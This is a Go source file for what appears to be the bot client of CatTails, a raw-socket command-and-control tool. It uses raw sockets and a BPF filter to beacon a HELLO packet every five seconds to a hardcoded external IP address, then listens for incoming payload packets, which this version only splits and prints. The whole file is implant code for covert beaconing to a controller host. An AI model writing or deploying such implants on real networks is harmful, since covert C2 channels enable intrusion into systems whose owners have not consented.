package main

import (
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	for {
		fd := cattails.NewSocket()
		defer unix.Close(fd)

		packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))

		addr := cattails.CreateAddrStruct(iface)

		cattails.SendPacket(fd, iface, addr, packet)
		fmt.Println("[+] Sent HELLO")
		// Send hello every 5 seconds
		time.Sleep(5 * time.Second)
	}
}

func botProcessPacket(packet gopacket.Packet) {

	fmt.Println("[+] Payload Received")
	data := string(packet.ApplicationLayer().Payload())

	payload := strings.Split(data, " ")
	fmt.Println("Payload:", payload)
}

func main() {

	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	readfd := cattails.NewSocket()
	defer unix.Close(readfd)
	fmt.Println("[+] Socket created")

	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
	fmt.Println("[+] Using interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("DST MAC:", dstMAC.String())

	// 18.191.209.30
	fmt.Println("[+] Starting HELLO timer")
	go sendHello(iface, src, net.IPv4(18, 191, 209, 30), dstMAC)

	// Listen for responses
	fmt.Println("[+] Listening")
	for {
		packet := cattails.BotReadPacket(readfd, vm)

		if packet != nil {
			go botProcessPacket(packet)
		}
	}

}
